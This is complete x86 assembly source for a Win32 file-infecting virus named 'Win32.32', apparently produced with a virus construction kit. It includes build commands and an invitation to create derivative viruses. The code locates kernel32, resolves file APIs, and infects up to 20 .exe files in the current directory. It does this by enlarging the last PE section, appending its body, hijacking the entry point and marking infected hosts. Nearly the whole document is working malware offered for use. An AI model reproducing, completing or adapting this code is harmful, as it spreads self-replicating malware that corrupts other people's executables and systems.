              
;
;
; Win32.32 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.32
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : 32
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type II
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 26
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov eax, offset WIN32_FIND_DATA
 add eax, ebp

 push eax
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 push eax
 pop dword ptr [ebp+FindHandle]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 mov ebx, 276d
 lea edx, [ebp+WFD_szFileName]


ClearOldData2:
 mov byte ptr [edx], 0h
                                        ; add edx, 1
 sub edx, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg esi, edi

 push edi
 mov edx, dword ptr [ebp+FindHandle]
 push edx
 call dword ptr [ebp+XFindNextFileA]
ret





;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad



 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 sub ebx, ebx
 add ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 inc ebx
 add ebx, 27d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 inc ebx
 add ebx, 3d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], ecx
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [ecx]
                                        ; mov ecx, ebx
 push ebx
 pop ecx
                                        ; mov edi, ebx
 push ebx
 pop edi
 push edx
 push edi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], esi
 add dword ptr [ebp+Trash1], 306383     ; Trash
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov ah, byte ptr [esi]
 cmp ah, byte ptr [edi]
 jne ApiNotFound
 sub edx, 1
                                        ; add edx, 1
 sub edx, -1d
 sub edx, 1
 jz FoundApi1
                                        ; add esi, 1
 sub esi, -1d
                                        ; add edi, 1
 sub edi, -1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 mov dword ptr [ebp+Trash1], edx        ; Trash
 pop edi
 pop edx
 mov ecx, dword ptr [ebp+NTableTemp]
 mov esi, dword ptr [ebp+TempApisearch3]
                                        ; add ecx, 4
 add ecx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
 ror eax, 27d                           ; Trash
 pop esi
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov edi, ebx
                                        ; clear ebx
 push 0
 pop ebx
 mov bx, word ptr [edi]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop eax
 popad
 jmp ExecuteHost



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ebx

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]

 lea edx, [ebp+APINames]
 xchg esi, edx


GetApisLoop: 
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

                                        ; clear edx
 mov edx, 0
 mov dl, byte ptr [esi]
                                        ; add esi, 1
 add esi, 1d

                                        ; search 'em
                                        ; edx contains Name-Lenght
                                        ; esi points to the Name
                                        ; eax points to the offset

 call SearchAPI1
 push esi
 add dword ptr [esp], edx
 pop esi
 mov ecx, dword ptr [ebp+TempAPI]
 mov dword ptr [eax], -1
 and dword ptr [eax], ecx
                                        ; add eax, 4
 add eax, 4d
 dec ebx
 jnz GetApisLoop
 lea ecx, [ebp+Outbreak]
 xchg ecx, esi

 push esi
ret



;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
 add ecx, 1717703d                      ; Trash
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, -17905d
 add esi, 17905d
 xor esi, dword ptr [ebp+OldEIP]

 push esi
 pop dword ptr [ebp+retEIP]

 push dword ptr [ebp+OldBase]
 pop edx

 push edx
 pop dword ptr [ebp+retBase]

 and ebx, ebx                           ; Trash


ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retEIP dd 0h
 add ebx,12345678h
 org $-4
 retBase dd 0h
 jmp ebx



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel by using hardcoded values
 mov edx, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov edx, 077f00000h
 call GetKernel32
 jnc GetApis
 mov edx, 077e00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear ecx
 mov ecx, -4192d
 add ecx, 4192d

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[ecx]
 lea edi, [ebp+GetKernel32Exception]

 push edi
 push eax

                                        ; add edx, 1
 add edx, 1d
GetKernelLoop:
                                        ; clear eax
 xor eax, eax
 sub edx, 1
 mov ax, word ptr [edx+03ch]
 test ax,0f800h
 jnz GetKernelLoop
 cmp edx, dword ptr [edx+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], edx
 mov eax, edx
 add eax, [edx+3Ch]
 mov [KernelPE+ebp], eax

                                        ; clear edi
 mov edi, -28854d
 add edi, 28854d

 pop dword ptr fs:[edi]
 pop eax
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear eax
 mov eax, 0

 mov edx, dword ptr fs:[eax]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear edx
 push 0
 pop edx

 pop dword ptr fs:[edx]
 pop ecx
 popad
 stc
ret


;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ebx

 mov ecx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ecx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea ebx, [ebp+filemask]
 xchg ebx, esi

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
 inc eax
 jz EndInfectCurDir
 adc ecx, 72597844d                     ; Trash

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 sub edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 mov edx, 0

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 add edx, 1d
 push edx
 push 80000000h or 40000000h
 lea edi, [ebp+WFD_szFileName]
 xchg ebx, edi

 push ebx
 call dword ptr [ebp+XCreateFileA]

 cmp eax, -1
 je Closed

 push eax
 pop dword ptr [ebp+FileHandle]
 dec edx                                ; Trash

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 adc dword ptr [ebp+Trash1], ebx        ; Trash
 push 0
 push edx
 push 0
                                        ; mov ecx, 4
 mov ecx, ( 4d - 7d )
 add ecx, 7d
 push ecx
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 add dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear ebx
 mov ebx, 0
 push edx
 push ebx
 or ecx, ebx                            ; Trash
 push ebx
                                        ; mov ecx, 2
 mov ecx, ( 2d xor 15d )
 xor ecx, 15d
 push ecx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 lea esi, [ebp+WFD_szFileName]
 xchg esi, ecx

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 mov eax, offset WFD_szFileName
 or edx, ebx                            ; Trash
 add eax, ebp


 push eax
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 cmp ebx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ecx, word ptr [edx]
 sub ecx, 'ZM'
 jz Goodfile
                                        ; clear ecx
 and ecx, 0
 test ecx, ecx
 jz Notagoodfile

Goodfile:
 cmp word ptr [edx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear esi
 and esi, 0
 add esi, dword ptr [edx+3Ch]
                                        ; check if header lies inside the file
 cmp esi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add esi, edx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [esi], 'EP'
 je Goodfile2
 jmp Notagoodfile

Goodfile2:
 mov ebx, 66084428d                     ; Trash
                                        ; check for previous Infection
 cmp dword ptr [esi+4Ch], '32'
 jz Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [esi+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [esi+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear ecx
 and ecx, 0
 add ecx, dword ptr [ebp+Attributes]
 push ecx
 lea ebx, [ebp+WFD_szFileName]
 xchg ecx, ebx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;                  [ ///// * Data * \\\\\ ]

Data:
 FindHandle  dd 0h
 NTableTemp  dd 0h
 KernelPE    dd 0h
 MapHandle   dd 0h
 TempApisearch3 dd 0h
 Trash1      dd 0h

 APINames:
 db 13d, 'FindNextFileA'
 db 14d, 'FindFirstFileA'
 db 15d, 'UnmapViewOfFile'
 db 18d, 'SetFileAttributesA'
 db 13d, 'MapViewOfFile'
 db 11d, 'CreateFileA'
 db 09d, 'FindClose'
 db 18d, 'GetFileAttributesA'
 db 11d, 'CloseHandle'
 db 18d, 'CreateFileMappingA'

 ATableVA    dd 0h
 OTableVA    dd 0h
 NewSize     dd 0h
 FileHandle  dd 0h
 AlignReg1   dd 0h
 InfCounter  dd 0h
 KernelMZ    dd 0h
 NewEIP      dd 0h
 NTableVA    dd 0h

 APIOffsets:
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileMappingA    dd 0h

 OldBase     dd 400000h
 OldEIP      dd 0h
 AlignReg2   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 TempAPI     dd 0h
 filemask    db '*.exE',0
 MapAddress  dd 0h
 db 'Virus : Win32.32 Author : SnakeByte',0
 counter     dw 0h
 Attributes  dd 0h




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edi
 push 0
 pop edi
 xor edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edi+3Ch]
 add esi, edi
                                        ; get File Alignment
 mov edx, [esi+3Ch]
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ebx
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ebx
 call Align
                                        ; clear ebx
 and ebx, 0
 add ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push ebx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov ecx, dword ptr [esi+3Ch]
 add ecx, esi
                                        ; infect by increasing the last section
 push ecx
 pop esi
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
 add ecx, edx
                                        ; add ecx, 120
 inc ecx
 add ecx, 119d
 mov ebx, dword ptr [esi+74h]
 clc
 rcl ebx, 3
 add ecx, ebx
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 add dword ptr [ebp+OldEIP], eax
 mov eax, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], eax
 mov ebx, [ecx+10h]
                                        ; mov edx, ebx
 mov edx, ebx
 add ecx, 14h
 add ebx, [ecx]
 sub ecx, 14h
 push ebx
 mov eax, edx
 add eax, [ecx+0Ch]
 mov dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
                                        ; clear eax
 mov eax, 0

 add eax, [ecx+10h]
 push eax
                                        ; calculate new section size
 push dword ptr [esi+3Ch]
 add eax, VirusSize
 pop dword ptr [ebp+AlignReg2]
 push eax
 pop dword ptr [ebp+AlignReg1]
 call Align
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [ecx+10h], 0h
 add dword ptr [ecx+10h], eax
 pop eax
 add eax,  (VirusSize-1113d)
 add eax, 1113d
 mov dword ptr [ecx+08h], 0
 add dword ptr [ecx+08h], eax
 mov eax, dword ptr [ecx+0Ch]
 add eax, dword ptr [ecx+10h]
 mov dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [ecx+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], '32'
                                        ; Append Virus
 pop edi
 mov ebx, VirusSize
 lea esi, [ebp+Virus]

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec ebx
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+InfCounter]
 add eax, -1
 mov dword ptr [ebp+InfCounter], 0
 add dword ptr [ebp+InfCounter], eax
 clc
ret

NoEXE:
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

